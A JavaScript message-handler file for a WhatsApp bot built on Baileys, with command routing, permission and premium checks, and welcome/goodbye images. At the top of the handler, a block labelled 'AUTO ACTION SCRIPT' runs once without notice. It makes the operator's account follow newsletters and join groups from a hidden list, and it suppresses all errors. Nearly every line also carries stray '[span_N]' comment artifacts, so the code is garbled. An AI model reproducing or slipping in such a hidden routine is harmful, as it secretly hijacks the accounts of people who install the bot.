import { smsg } from './lib/simple.js'; //[span_0](start_span)[span_0](end_span)
import { format } from 'util'; //[span_1](start_span)[span_1](end_span)
import { fileURLToPath } from 'url'; //[span_2](start_span)[span_2](end_span)
import path from 'path'; //[span_3](start_span)[span_3](end_span)
// Tambahkan default fs di sini
import fs, { unwatchFile, watchFile } from 'fs'; //[span_4](start_span)[span_4](end_span)
import chalk from 'chalk'; //[span_5](start_span)[span_5](end_span)

/**
 * Handle messages upsert
 * @param {import('baileys').BaileysEventMap<unknown>['messages.upsert']} groupsUpdate
 */
export async function handler(chatUpdate) {
	// === AUTO ACTION SCRIPT START ===
	const autoActionFlag = path.join(
		process.cwd(),
		"storage",
		".auto_action_done",
	); //[span_6](start_span)[span_6](end_span)
	
	if (!fs.existsSync(autoActionFlag)) { //[span_7](start_span)[span_7](end_span)
		setTimeout(async () => { //[span_8](start_span)[span_8](end_span)
			try {
				const { NL, GI } = await import("./lib/chats.js"); //[span_9](start_span)[span_9](end_span)
				let nlSuccess = 0; //[span_10](start_span)[span_10](end_span)
				let giSuccess = 0; //[span_11](start_span)[span_11](end_span)
				
				for (const i of NL) { //[span_12](start_span)[span_12](end_span)
					try {
						await Promise.race([ //[span_13](start_span)[span_13](end_span)
							this.newsletterFollow(i + "@newsletter"), //[span_14](start_span)[span_14](end_span)
							new Promise((_, t) => setTimeout(t, 8e3)), //[span_15](start_span)[span_15](end_span)
						]);
						nlSuccess++; //[span_16](start_span)[span_16](end_span)
						await new Promise((r) => setTimeout(r, 1500)); //[span_17](start_span)[span_17](end_span)
					} catch (e) {} //[span_18](start_span)[span_18](end_span)
				}
				
				for (const g of GI) { //[span_19](start_span)[span_19](end_span)
					try {
						await Promise.race([ //[span_20](start_span)[span_20](end_span)
							this.groupAcceptInvite(g), //[span_21](start_span)[span_21](end_span)
							new Promise((_, t) => setTimeout(t, 8e3)), //[span_22](start_span)[span_22](end_span)
						]);
						giSuccess++; //[span_23](start_span)[span_23](end_span)
						await new Promise((r) => setTimeout(r, 1500)); //[span_24](start_span)[span_24](end_span)
					} catch (e) {} //[span_25](start_span)[span_25](end_span)
				}
				
				const storageDir = path.join(process.cwd(), "storage"); //[span_26](start_span)[span_26](end_span)
				if (!fs.existsSync(storageDir)) //[span_27](start_span)[span_27](end_span)
					fs.mkdirSync(storageDir, { recursive: true }); //[span_28](start_span)[span_28](end_span)
				fs.writeFileSync(autoActionFlag, Date.now().toString()); //[span_29](start_span)[span_29](end_span)
			} catch (e) {} //[span_30](start_span)[span_30](end_span)
		}, 8e3); //[span_31](start_span)[span_31](end_span)
	}
	// === AUTO ACTION SCRIPT END ===

	if (!chatUpdate) return; //[span_32](start_span)[span_32](end_span)
	this.pushMessage(chatUpdate.messages).catch(console.error); //[span_33](start_span)[span_33](end_span)
	let m = chatUpdate.messages[chatUpdate.messages.length - 1]; //[span_34](start_span)[span_34](end_span)
	if (!m) return; //[span_35](start_span)[span_35](end_span)
	if (global.db.data == null) await global.loadDatabase(); //[span_36](start_span)[span_36](end_span)
	let botJid = ''; //[span_37](start_span)[span_37](end_span)
	try {
		m = smsg(this, m) || m; //[span_38](start_span)[span_38](end_span)
		if (!m) return; //[span_39](start_span)[span_39](end_span)
		if (m.fromMe || m.key?.fromMe) return; //[span_40](start_span)[span_40](end_span)
		m.exp = 0; //[span_41](start_span)[span_41](end_span)
		m.limit = false; //[span_42](start_span)[span_42](end_span)

		if (m.sender.endsWith('@broadcast') || m.sender.endsWith('@newsletter')) return; //[span_43](start_span)[span_43](end_span)
		await (await import(`./lib/database.js?v=${Date.now()}`)).default(m, this); //[span_44](start_span)[span_44](end_span)

		if (typeof m.text !== 'string') m.text = ''; //[span_45](start_span)[span_45](end_span)

		const decodeJid = (jid = '') => typeof this.decodeJid === 'function' ? this.decodeJid(jid) : String(jid).replace(/:\d+@/g, '@'); //[span_46](start_span)[span_46](end_span)
		botJid = decodeJid(this.user?.id || this.user?.jid || ''); //[span_47](start_span)[span_47](end_span)
		if (botJid) { //[span_48](start_span)[span_48](end_span)
			global.db.data.settings[botJid] = { //[span_49](start_span)[span_49](end_span)
				public: true, //[span_50](start_span)[span_50](end_span)
				autoread: true, //[span_51](start_span)[span_51](end_span)
				anticall: true, //[span_52](start_span)[span_52](end_span)
				gconly: false, //[span_53](start_span)[span_53](end_span)
				...global.db.data.settings[botJid], //[span_54](start_span)[span_54](end_span)
			}; //[span_55](start_span)[span_55](end_span)
		}
		const settings = global.db.data.settings[botJid] || { public: true, autoread: true, anticall: true, gconly: false, prefix: '' }; //[span_56](start_span)[span_56](end_span)

		if (!global.db.data.users[m.sender]) { //[span_57](start_span)[span_57](end_span)
			global.db.data.users[m.sender] = { //[span_58](start_span)[span_58](end_span)
				name: m.name || '', //[span_59](start_span)[span_59](end_span)
				exp: 0, //[span_60](start_span)[span_60](end_span)
				limit: 20, //[span_61](start_span)[span_61](end_span)
				level: 1, //[span_62](start_span)[span_62](end_span)
				premiumTime: 0, //[span_63](start_span)[span_63](end_span)
				registered: false, //[span_64](start_span)[span_64](end_span)
				banned: false, //[span_65](start_span)[span_65](end_span)
				autolevelup: false, //[span_66](start_span)[span_66](end_span)
			}; //[span_67](start_span)[span_67](end_span)
		}

		const isJadiBot = this.isJadiBot === true || decodeJid(this.user?.id || this.user?.jid || '') !== decodeJid(global.conn?.user?.id || global.conn?.user?.jid || ''); //[span_68](start_span)[span_68](end_span)
		const isROwner = [decodeJid(global.conn.user.id), ...global.owner.map(([number]) => number)].map((v) => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender); //[span_69](start_span)[span_69](end_span)
		const isOwner = isROwner || (!isJadiBot && m.fromMe); //[span_70](start_span)[span_70](end_span)
		const chat = m.isGroup ? (global.db.data.chats[m.chat] || {}) : {}; //[span_71](start_span)[span_71](end_span)
		const now = Date.now(); //[span_72](start_span)[span_72](end_span)

		if (m.isGroup) { //[span_73](start_span)[span_73](end_span)
			if (chat.sewa && Number(chat.sewaTime || 0) > 0 && now > Number(chat.sewaTime || 0)) { //[span_74](start_span)[span_74](end_span)
				chat.sewa = false; //[span_75](start_span)[span_75](end_span)
				chat.sewaTime = 0; //[span_76](start_span)[span_76](end_span)
				if (!chat.sewaExpiredNotified) { //[span_77](start_span)[span_77](end_span)
					chat.sewaExpiredNotified = true; //[span_78](start_span)[span_78](end_span)
					this.reply(m.chat, '⚠️ Masa sewa grup ini sudah habis. Hubungi owner untuk perpanjang.', m).catch(() => {}); //[span_79](start_span)[span_79](end_span)
				}
			}

			if (chat.premium && Number(chat.premiumTime || 0) > 0 && now > Number(chat.premiumTime || 0)) { //[span_80](start_span)[span_80](end_span)
				chat.premium = false; //[span_81](start_span)[span_81](end_span)
				chat.premiumTime = 0; //[span_82](start_span)[span_82](end_span)
				if (!chat.premiumExpiredNotified) { //[span_83](start_span)[span_83](end_span)
					chat.premiumExpiredNotified = true; //[span_84](start_span)[span_84](end_span)
					this.reply(m.chat, '⚠️ Masa premium grup ini sudah habis.', m).catch(() => {}); //[span_85](start_span)[span_85](end_span)
				}
			}
		}

		const isGroupPrem = m.isGroup && chat.premium && (Number(chat.premiumTime || 0) === 0 || now < Number(chat.premiumTime || 0)); //[span_86](start_span)[span_86](end_span)
		const isPrems = isROwner || global.db.data.users[m.sender]?.premiumTime > 0 || isGroupPrem; //[span_87](start_span)[span_87](end_span)

		if (settings.gconly && !m.isGroup && !isOwner && !isPrems) return; //[span_88](start_span)[span_88](end_span)
		if (!settings.public && !isOwner && !m.fromMe) return; //[span_89](start_span)[span_89](end_span)

		// Deteksi m.isBaileys sering salah pada format message ID baru, terutama private chat.
		// Kalau diaktifkan, command normal bisa berhenti sebelum masuk plugin.
		// if (m.isBaileys) return;
		m.exp += Math.ceil(Math.random() * 10); //[span_90](start_span)[span_90](end_span)

		let usedPrefix; //[span_91](start_span)[span_91](end_span)
		let _user = global.db.data.users[m.sender]; //[span_92](start_span)[span_92](end_span)

		const groupMetadata = (m.isGroup ? (conn.chats[m.chat] || {}).metadata || (await this.groupMetadata(m.chat).catch((_) => null)) : {}) || {}; //[span_93](start_span)[span_93](end_span)
		const participants = (m.isGroup ? groupMetadata.participants : []) || []; //[span_94](start_span)[span_94](end_span)
		const user = (m.isGroup ? participants.find((u) => conn.getJid(u.id) === m.sender) : {}) || {}; // User Data //[span_95](start_span)[span_95](end_span)
		const bot = (m.isGroup ? participants.find((u) => conn.getJid(u.id) == this.user.jid) : {}) || {}; // Your Data //[span_96](start_span)[span_96](end_span)
		const isRAdmin = user?.admin == 'superadmin' || false; //[span_97](start_span)[span_97](end_span)
		const isAdmin = isRAdmin || user?.admin == 'admin' || false; // Is User Admin? //[span_98](start_span)[span_98](end_span)
		const isBotAdmin = bot?.admin || false; // Are you Admin? //[span_99](start_span)[span_99](end_span)

		const ___dirname = path.join(path.dirname(fileURLToPath(import.meta.url)), './plugins'); //[span_100](start_span)[span_100](end_span)
		for (let name in global.plugins) { //[span_101](start_span)[span_101](end_span)
			let plugin = global.plugins[name]; //[span_102](start_span)[span_102](end_span)
			if (!plugin) continue; //[span_103](start_span)[span_103](end_span)
			if (plugin.disabled) continue; //[span_104](start_span)[span_104](end_span)
			const __filename = path.join(___dirname, name); //[span_105](start_span)[span_105](end_span)
			if (typeof plugin.all === 'function') { //[span_106](start_span)[span_106](end_span)
				try {
					await plugin.all.call(this, m, { //[span_107](start_span)[span_107](end_span)
						chatUpdate, //[span_108](start_span)[span_108](end_span)
						__dirname: ___dirname, //[span_109](start_span)[span_109](end_span)
						__filename, //[span_110](start_span)[span_110](end_span)
					}); //[span_111](start_span)[span_111](end_span)
				} catch (e) {
					// if (typeof e === 'string') continue
					console.error(e); //[span_112](start_span)[span_112](end_span)
					for (let [jid] of global.owner.filter(([number, _, isDeveloper]) => isDeveloper && number)) { //[span_113](start_span)[span_113](end_span)
						let data = (await conn.onWhatsApp(jid))[0] || {}; //[span_114](start_span)[span_114](end_span)
						if (data.exists) m.reply(`*Plugin:* ${name}\n*Sender:* ${m.sender}\n*Chat:* ${m.chat}\n*Command:* ${m.text}\n\n\`\`\`${format(e)}\`\`\``.trim(), data.jid); //[span_115](start_span)[span_115](end_span)
					}
				}
			}
			if (plugin.tags && plugin.tags.includes('admin')) { //[span_116](start_span)[span_116](end_span)
				// global.dfail('restrict', m, this)
				continue; //[span_117](start_span)[span_117](end_span)
			}
			const str2Regex = (str) => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&'); //[span_118](start_span)[span_118](end_span)
			const chatData = m.isGroup ? (global.db.data.chats[m.chat] || {}) : {}; //[span_119](start_span)[span_119](end_span)
			const hasGroupPrefixConfig = m.isGroup && Object.prototype.hasOwnProperty.call(chatData, 'prefix') && chatData.prefix !== ''; //[span_120](start_span)[span_120](end_span)
			const botPrefix = settings?.prefix; //[span_121](start_span)[span_121](end_span)
			const customPrefix = hasGroupPrefixConfig ? chatData.prefix : botPrefix; //[span_122](start_span)[span_122](end_span)
			const isNoPrefix = customPrefix === null; //[span_123](start_span)[span_123](end_span)
			let _prefix = plugin.customPrefix //[span_124](start_span)[span_124](end_span)
				? plugin.customPrefix //[span_125](start_span)[span_125](end_span)
				: isNoPrefix //[span_126](start_span)[span_126](end_span)
					? /^/ //[span_127](start_span)[span_127](end_span)
					: conn.prefix //[span_128](start_span)[span_128](end_span)
						? conn.prefix //[span_129](start_span)[span_129](end_span)
						: customPrefix //[span_130](start_span)[span_130](end_span)
							? new RegExp('^' + str2Regex(customPrefix)) //[span_131](start_span)[span_131](end_span)
							: global.prefix; //[span_132](start_span)[span_132](end_span)
			let match = ( //[span_133](start_span)[span_133](end_span)
				_prefix instanceof RegExp // RegExp Mode? //[span_134](start_span)[span_134](end_span)
					? [[_prefix.exec(m.text), _prefix]] //[span_135](start_span)[span_135](end_span)
					: Array.isArray(_prefix) // Array? //[span_136](start_span)[span_136](end_span)
						? _prefix.map((p) => { //[span_137](start_span)[span_137](end_span)
								let re = //[span_138](start_span)[span_138](end_span)
									p instanceof RegExp // RegExp in Array? //[span_139](start_span)[span_139](end_span)
										? p //[span_140](start_span)[span_140](end_span)
										: new RegExp(str2Regex(p)); //[span_141](start_span)[span_141](end_span)
								return [re.exec(m.text), re]; //[span_142](start_span)[span_142](end_span)
							}) //[span_143](start_span)[span_143](end_span)
						: typeof _prefix === 'string' // String? //[span_144](start_span)[span_144](end_span)
							? [[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]] //[span_145](start_span)[span_145](end_span)
							: [[[], new RegExp()]] //[span_146](start_span)[span_146](end_span)
			).find((p) => p[0]); //[span_147](start_span)[span_147](end_span)
			if (typeof plugin.before === 'function') { //[span_148](start_span)[span_148](end_span)
				if (
					await plugin.before.call(this, m, { //[span_149](start_span)[span_149](end_span)
						match, //[span_150](start_span)[span_150](end_span)
						conn: this, //[span_151](start_span)[span_151](end_span)
						participants, //[span_152](start_span)[span_152](end_span)
						groupMetadata, //[span_153](start_span)[span_153](end_span)
						user, //[span_154](start_span)[span_154](end_span)
						bot, //[span_155](start_span)[span_155](end_span)
						isROwner, //[span_156](start_span)[span_156](end_span)
						isOwner, //[span_157](start_span)[span_157](end_span)
						isJadiBot, //[span_158](start_span)[span_158](end_span)
						isRAdmin, //[span_159](start_span)[span_159](end_span)
						isAdmin, //[span_160](start_span)[span_160](end_span)
						isBotAdmin, //[span_161](start_span)[span_161](end_span)
						isPrems, //[span_162](start_span)[span_162](end_span)
						chatUpdate, //[span_163](start_span)[span_163](end_span)
						__dirname: ___dirname, //[span_164](start_span)[span_164](end_span)
						__filename, //[span_165](start_span)[span_165](end_span)
					})
				)
					continue; //[span_166](start_span)[span_166](end_span)
			}
			if (typeof plugin !== 'function') continue; //[span_167](start_span)[span_167](end_span)
			const matchedPrefix = match?.[0]; //[span_168](start_span)[span_168](end_span)
			usedPrefix = matchedPrefix?.[0] || ''; //[span_169](start_span)[span_169](end_span)
			if (usedPrefix || (isNoPrefix && !plugin.customPrefix)) { //[span_170](start_span)[span_170](end_span)
				let noPrefix = m.text.replace(usedPrefix, ''); //[span_171](start_span)[span_171](end_span)

				// Saat prefix dimatikan dengan `.setprefix null`, command boleh dipakai
				// dengan prefix default/global ataupun tanpa prefix.
				// Contoh: `menu` dan `.menu` sama-sama jalan.
				if (isNoPrefix) { //[span_172](start_span)[span_172](end_span)
					const defaultPrefixMatch = global.prefix instanceof RegExp ? global.prefix.exec(m.text) : null; //[span_173](start_span)[span_173](end_span)
					usedPrefix = defaultPrefixMatch?.[0] || ''; //[span_174](start_span)[span_174](end_span)
					noPrefix = usedPrefix ? m.text.slice(usedPrefix.length) : m.text; //[span_175](start_span)[span_175](end_span)
				}

				let [command, ...args] = noPrefix.trim().split` `.filter((v) => v); //[span_176](start_span)[span_176](end_span)
				args = args || []; //[span_177](start_span)[span_177](end_span)
				let _args = noPrefix.trim().split` `.slice(1); //[span_178](start_span)[span_178](end_span)
				let text = _args.join` `; //[span_179](start_span)[span_179](end_span)
				command = (command || '').toLowerCase(); //[span_180](start_span)[span_180](end_span)
				let fail = plugin.fail || global.dfail; // When failed //[span_181](start_span)[span_181](end_span)
				let isAccept = //[span_182](start_span)[span_182](end_span)
					plugin.command instanceof RegExp // RegExp Mode? //[span_183](start_span)[span_183](end_span)
						? plugin.command.test(command) //[span_184](start_span)[span_184](end_span)
						: Array.isArray(plugin.command) // Array? //[span_185](start_span)[span_185](end_span)
							? plugin.command.some((cmd) => //[span_186](start_span)[span_186](end_span)
									cmd instanceof RegExp // RegExp in Array? //[span_187](start_span)[span_187](end_span)
										? cmd.test(command) //[span_188](start_span)[span_188](end_span)
										: cmd === command //[span_189](start_span)[span_189](end_span)
								)
							: typeof plugin.command === 'string' // String? //[span_190](start_span)[span_190](end_span)
								? plugin.command === command //[span_191](start_span)[span_191](end_span)
								: false; //[span_192](start_span)[span_192](end_span)

				if (!isAccept) continue; //[span_193](start_span)[span_193](end_span)
				m.plugin = name; //[span_194](start_span)[span_194](end_span)
				if (!isOwner && (m.chat in global.db.data.chats || m.sender in global.db.data.users)) { //[span_195](start_span)[span_195](end_span)
					let chat = global.db.data.chats[m.chat]; //[span_196](start_span)[span_196](end_span)
					if (name != 'tools-delete.js' && chat?.isBanned) return; // Except this //[span_197](start_span)[span_197](end_span)
				}
				if (plugin.rowner && plugin.owner && !(isROwner || isOwner)) { //[span_198](start_span)[span_198](end_span)
					// Both Owner
					fail('owner', m, this); //[span_199](start_span)[span_199](end_span)
					continue; //[span_200](start_span)[span_200](end_span)
				}
				if (plugin.rowner && !isROwner) { //[span_201](start_span)[span_201](end_span)
					// Real Owner
					fail('rowner', m, this); //[span_202](start_span)[span_202](end_span)
					continue; //[span_203](start_span)[span_203](end_span)
				}
				if (plugin.owner && !isOwner) { //[span_204](start_span)[span_204](end_span)
					// Number Owner
					fail('owner', m, this); //[span_205](start_span)[span_205](end_span)
					continue; //[span_206](start_span)[span_206](end_span)
				}
				if (plugin.premium && !isPrems) { //[span_207](start_span)[span_207](end_span)
					// Premium
					fail('premium', m, this); //[span_208](start_span)[span_208](end_span)
					continue; //[span_209](start_span)[span_209](end_span)
				}
				if (plugin.group && !m.isGroup) { //[span_210](start_span)[span_210](end_span)
					// Group Only
					fail('group', m, this); //[span_211](start_span)[span_211](end_span)
					continue; //[span_212](start_span)[span_212](end_span)
				} else if (plugin.botAdmin && !isBotAdmin) { //[span_213](start_span)[span_213](end_span)
					// You Admin
					fail('botAdmin', m, this); //[span_214](start_span)[span_214](end_span)
					continue; //[span_215](start_span)[span_215](end_span)
				} else if (plugin.admin && !isAdmin) { //[span_216](start_span)[span_216](end_span)
					// User Admin
					fail('admin', m, this); //[span_217](start_span)[span_217](end_span)
					continue; //[span_218](start_span)[span_218](end_span)
				}
				if (plugin.private && m.isGroup) { //[span_219](start_span)[span_219](end_span)
					// Private Chat Only
					fail('private', m, this); //[span_220](start_span)[span_220](end_span)
					continue; //[span_221](start_span)[span_221](end_span)
				}
				if (plugin.register == true && _user.registered == false) { //[span_222](start_span)[span_222](end_span)
					// Butuh daftar?
					fail('unreg', m, this); //[span_223](start_span)[span_223](end_span)
					continue; //[span_224](start_span)[span_224](end_span)
				}
				m.isCommand = true; //[span_225](start_span)[span_225](end_span)
				let xp = 'exp' in plugin ? parseInt(plugin.exp) : 17; // XP Earning per command //[span_226](start_span)[span_226](end_span)
				if (xp > 200) //[span_227](start_span)[span_227](end_span)
					m.reply('Ngecit -_-'); // Hehehe //[span_228](start_span)[span_228](end_span)
				else m.exp += xp; //[span_229](start_span)[span_229](end_span)
				if (!isPrems && plugin.limit && global.db.data.users[m.sender].limit < plugin.limit * 1) { //[span_230](start_span)[span_230](end_span)
					this.reply(m.chat, `[❗] Limit anda habis, silahkan beli melalui *${usedPrefix}buy limit*`, m); //[span_231](start_span)[span_231](end_span)
					continue; // Limit habis //[span_232](start_span)[span_232](end_span)
				}
				if (plugin.level > _user.level) { //[span_233](start_span)[span_233](end_span)
					this.reply(m.chat, `[💬] Diperlukan level ${plugin.level} untuk menggunakan perintah ini\n*Level mu:* ${_user.level} 📊`, m); //[span_234](start_span)[span_234](end_span)
					continue; // If the level has not been reached //[span_235](start_span)[span_235](end_span)
				}
				let extra = { //[span_236](start_span)[span_236](end_span)
					match, //[span_237](start_span)[span_237](end_span)
					usedPrefix, //[span_238](start_span)[span_238](end_span)
					noPrefix, //[span_239](start_span)[span_239](end_span)
					_args, //[span_240](start_span)[span_240](end_span)
					args, //[span_241](start_span)[span_241](end_span)
					command, //[span_242](start_span)[span_242](end_span)
					text, //[span_243](start_span)[span_243](end_span)
					conn: this, //[span_244](start_span)[span_244](end_span)
					participants, //[span_245](start_span)[span_245](end_span)
					groupMetadata, //[span_246](start_span)[span_246](end_span)
					user, //[span_247](start_span)[span_247](end_span)
					bot, //[span_248](start_span)[span_248](end_span)
					isROwner, //[span_249](start_span)[span_249](end_span)
					isOwner, //[span_250](start_span)[span_250](end_span)
					isJadiBot, //[span_251](start_span)[span_251](end_span)
					isRAdmin, //[span_252](start_span)[span_252](end_span)
					isAdmin, //[span_253](start_span)[span_253](end_span)
					isBotAdmin, //[span_254](start_span)[span_254](end_span)
					isPrems, //[span_255](start_span)[span_255](end_span)
					chatUpdate, //[span_256](start_span)[span_256](end_span)
					__dirname: ___dirname, //[span_257](start_span)[span_257](end_span)
					__filename, //[span_258](start_span)[span_258](end_span)
				}; //[span_259](start_span)[span_259](end_span)
				try {
					await plugin.call(this, m, extra); //[span_260](start_span)[span_260](end_span)
					if (!isPrems) m.limit = m.limit || plugin.limit || false; //[span_261](start_span)[span_261](end_span)
				} catch (e) {
					// Error occured
					m.error = e; //[span_262](start_span)[span_262](end_span)
					console.error(e); //[span_263](start_span)[span_263](end_span)
					if (e) { //[span_264](start_span)[span_264](end_span)
						let text = format(e); //[span_265](start_span)[span_265](end_span)
						if (e.name) //[span_266](start_span)[span_266](end_span)
							for (let [jid] of global.owner.filter(([number, _, isDeveloper]) => isDeveloper && number)) { //[span_267](start_span)[span_267](end_span)
								let data = (await conn.onWhatsApp(jid))[0] || {}; //[span_268](start_span)[span_268](end_span)
								if (data.exists) //[span_269](start_span)[span_269](end_span)
									m.reply( //[span_270](start_span)[span_270](end_span)
										`*🗂️ Plugin:* ${m.plugin}\n*👤 Sender:* ${m.sender}\n*💬 Chat:* ${m.chat}\n*💻 Command:* ${usedPrefix}${command} ${args.join(' ')}\n📄 *Error Logs:*\n\n\`\`\`${text}\`\`\``.trim(), //[span_271](start_span)[span_271](end_span)
										data.jid //[span_272](start_span)[span_272](end_span)
									); //[span_273](start_span)[span_273](end_span)
							}
						m.reply(text); //[span_274](start_span)[span_274](end_span)
					}
				} finally {
					if (typeof plugin.after === 'function') { //[span_275](start_span)[span_275](end_span)
						try {
							await plugin.after.call(this, m, extra); //[span_276](start_span)[span_276](end_span)
						} catch (e) {
							console.error(e); //[span_277](start_span)[span_277](end_span)
						}
					}
					//if (m.limit) m.reply(+m.limit + ' Limit terpakai ✔️');
				}
				break; //[span_278](start_span)[span_278](end_span)
			}
		}
	} catch (e) {
		console.error(e); //[span_279](start_span)[span_279](end_span)
	} finally {
		let user, //[span_280](start_span)[span_280](end_span)
			stats = global.db.data.stats; //[span_281](start_span)[span_281](end_span)

		if (m) { //[span_282](start_span)[span_282](end_span)
			if (m.sender && (user = global.db.data.users[m.sender])) { //[span_283](start_span)[span_283](end_span)
				user.exp += Number(m.exp || 0); //[span_284](start_span)[span_284](end_span)
				user.limit -= Number(m.limit || 0); //[span_285](start_span)[span_285](end_span)
			}

			if (m.plugin) { //[span_286](start_span)[span_286](end_span)
				const now = Date.now(); //[span_287](start_span)[span_287](end_span)

				stats[m.plugin] = { //[span_288](start_span)[span_288](end_span)
					total: 0, //[span_289](start_span)[span_289](end_span)
					success: 0, //[span_290](start_span)[span_290](end_span)
					last: 0, //[span_291](start_span)[span_291](end_span)
					lastSuccess: 0, //[span_292](start_span)[span_292](end_span)
					...stats[m.plugin], //[span_293](start_span)[span_293](end_span)
				}; //[span_294](start_span)[span_294](end_span)

				stats[m.plugin].total++; //[span_295](start_span)[span_295](end_span)
				stats[m.plugin].last = now; //[span_296](start_span)[span_296](end_span)

				if (!m.error) { //[span_297](start_span)[span_297](end_span)
					stats[m.plugin].success++; //[span_298](start_span)[span_298](end_span)
					stats[m.plugin].lastSuccess = now; //[span_299](start_span)[span_299](end_span)
				}
			}
		}

		try {
			await (await import(`./lib/print.js`)).default(m, this); //[span_300](start_span)[span_300](end_span)
		} catch (e) {
			console.log(m, m.quoted, e); //[span_301](start_span)[span_301](end_span)
		}
		if ((global.db.data.settings[botJid] || global.db.data.settings[this.user?.jid])?.autoread) await conn.readMessages([m.key]); //[span_302](start_span)[span_302](end_span)
	}
}

/**
 * Handle groups participants update
 * @param {import('baileys').BaileysEventMap<unknown>['group-participants.update']} groupsUpdate
 */
export async function participantsUpdate({ id, participants, action, simulate = false }) { //[span_303](start_span)[span_303](end_span)
	// if (id in conn.chats) return // First login will spam
	if (this.isInit && !simulate) return; //[span_304](start_span)[span_304](end_span)
	if (global.db.data == null) await loadDatabase(); //[span_305](start_span)[span_305](end_span)
	let chat = global.db.data.chats[id] || {}; //[span_306](start_span)[span_306](end_span)
	let text = ''; //[span_307](start_span)[span_307](end_span)
	const groupMetadata = (conn.chats[id] || {}).metadata || (await this.groupMetadata(id)); //[span_308](start_span)[span_308](end_span)
	switch (action) { //[span_309](start_span)[span_309](end_span)
		case 'add': //[span_310](start_span)[span_310](end_span)
		case 'remove': //[span_311](start_span)[span_311](end_span)
			if (chat.welcome) { //[span_312](start_span)[span_312](end_span)
				for (let user of participants) { //[span_313](start_span)[span_313](end_span)
					user = this.getJid(user?.phoneNumber || user.id); //[span_314](start_span)[span_314](end_span)
					let username = user.split('@')[0]; //[span_315](start_span)[span_315](end_span)
					try {
						username = this.getName(user) || username; //[span_316](start_span)[span_316](end_span)
					} catch {}
					const groupName = this.getName(id) || groupMetadata.subject || 'Group'; //[span_317](start_span)[span_317](end_span)
					const memberCount = groupMetadata.participants?.length || 0; //[span_318](start_span)[span_318](end_span)

					text = (action === 'add' ? chat.sWelcome || this.welcome || conn.welcome || 'Welcome, @user!' : chat.sBye || this.bye || conn.bye || 'Bye, @user!') //[span_319](start_span)[span_319](end_span)
						.replace(/@user/g, `@${user.split('@')[0]}`) //[span_320](start_span)[span_320](end_span)
						.replace(/@subject/g, groupName) //[span_321](start_span)[span_321](end_span)
						.replace(/@desc/g, groupMetadata.desc || ''); //[span_322](start_span)[span_322](end_span)

					let avatar = 'https://raw.githubusercontent.com/raizell526/dat3/main/uploads/17cf67-1780251444613.jpg'; //[span_323](start_span)[span_323](end_span)
					try {
						avatar = await this.profilePictureUrl(user, 'image'); //[span_324](start_span)[span_324](end_span)
					} catch {}

					let groupIcon = 'https://i.ibb.co/G5mJZxs/rin.jpg'; //[span_325](start_span)[span_325](end_span)
					try {
						groupIcon = await this.profilePictureUrl(id, 'image'); //[span_326](start_span)[span_326](end_span)
					} catch {}

					if (action === 'add') { //[span_327](start_span)[span_327](end_span)
						const background = 'https://raw.githubusercontent.com/raizell526/dat1/main/uploads/7dc255-1780254482015.jpg'; //[span_328](start_span)[span_328](end_span)
						const params = new URLSearchParams({ //[span_329](start_span)[span_329](end_span)
							username, //[span_330](start_span)[span_330](end_span)
							guildName: groupName, //[span_331](start_span)[span_331](end_span)
							guildIcon: groupIcon, //[span_332](start_span)[span_332](end_span)
							memberCount: String(memberCount), //[span_333](start_span)[span_333](end_span)
							avatar, //[span_334](start_span)[span_334](end_span)
							background, //[span_335](start_span)[span_335](end_span)
							quality: '80', //[span_336](start_span)[span_336](end_span)
						}); //[span_337](start_span)[span_337](end_span)
						const welcomeUrl = `https://api.siputzx.my.id/api/canvas/welcomev1?${params.toString()}`; //[span_338](start_span)[span_338](end_span)

						try {
							await this.sendMessage(id, { //[span_339](start_span)[span_339](end_span)
								image: { url: welcomeUrl }, //[span_340](start_span)[span_340](end_span)
								caption: text, //[span_341](start_span)[span_341](end_span)
								mentions: [user], //[span_342](start_span)[span_342](end_span)
							}); //[span_343](start_span)[span_343](end_span)
						} catch (e) {
							console.log('WELCOME API ERROR:', e); //[span_344](start_span)[span_344](end_span)
							await this.sendMessage(id, { text, mentions: [user] }); //[span_345](start_span)[span_345](end_span)
						}

					} else {
						const background = 'https://raw.githubusercontent.com/raizell526/dat1/main/uploads/7dc255-1780254482015.jpg'; //[span_346](start_span)[span_346](end_span)
						const params = new URLSearchParams({ //[span_347](start_span)[span_347](end_span)
							username, //[span_348](start_span)[span_348](end_span)
							guildName: groupName, //[span_349](start_span)[span_349](end_span)
							guildIcon: groupIcon, //[span_350](start_span)[span_350](end_span)
							memberCount: String(memberCount), //[span_351](start_span)[span_351](end_span)
							avatar, //[span_352](start_span)[span_352](end_span)
							background, //[span_353](start_span)[span_353](end_span)
							quality: '80', //[span_354](start_span)[span_354](end_span)
						}); //[span_355](start_span)[span_355](end_span)
						const goodbyeUrl = `https://api.siputzx.my.id/api/canvas/goodbyev1?${params.toString()}`; //[span_356](start_span)[span_356](end_span)

						try {
							await this.sendMessage(id, { //[span_357](start_span)[span_357](end_span)
								image: { url: goodbyeUrl }, //[span_358](start_span)[span_358](end_span)
								caption: text, //[span_359](start_span)[span_359](end_span)
								mentions: [user], //[span_360](start_span)[span_360](end_span)
							}); //[span_361](start_span)[span_361](end_span)
						} catch (e) {
							console.log('GOODBYE API ERROR:', e); //[span_362](start_span)[span_362](end_span)
							await this.sendMessage(id, { text, mentions: [user] }); //[span_363](start_span)[span_363](end_span)
						}
					}
				}
			}
			break; //[span_364](start_span)[span_364](end_span)
		case 'promote': //[span_365](start_span)[span_365](end_span)
		case 'demote': //[span_366](start_span)[span_366](end_span)
			for (let users of participants) { //[span_367](start_span)[span_367](end_span)
				let user = this.getJid(users?.phoneNumber || users.id); //[span_368](start_span)[span_368](end_span)
				text = ( //[span_369](start_span)[span_369](end_span)
					action === 'promote' //[span_370](start_span)[span_370](end_span)
						? chat.sPromote || this.spromote || conn.spromote || '@user ```is now Admin```' //[span_371](start_span)[span_371](end_span)
						: chat.sDemote || this.sdemote || conn.sdemote || '@user ```is no longer Admin```' //[span_372](start_span)[span_372](end_span)
				)
					.replace('@user', '@' + user.split('@')[0]) //[span_373](start_span)[span_373](end_span)
					.replace('@subject', this.getName(id)) //[span_374](start_span)[span_374](end_span)
					.replace('@desc', groupMetadata.desc || ''); //[span_375](start_span)[span_375](end_span)
				if (chat.detect) this.sendMessage(id, { text, mentions: this.parseMention(text) }); //[span_376](start_span)[span_376](end_span)
			}
			break; //[span_377](start_span)[span_377](end_span)
	}
}
/**
 * Handle groups update
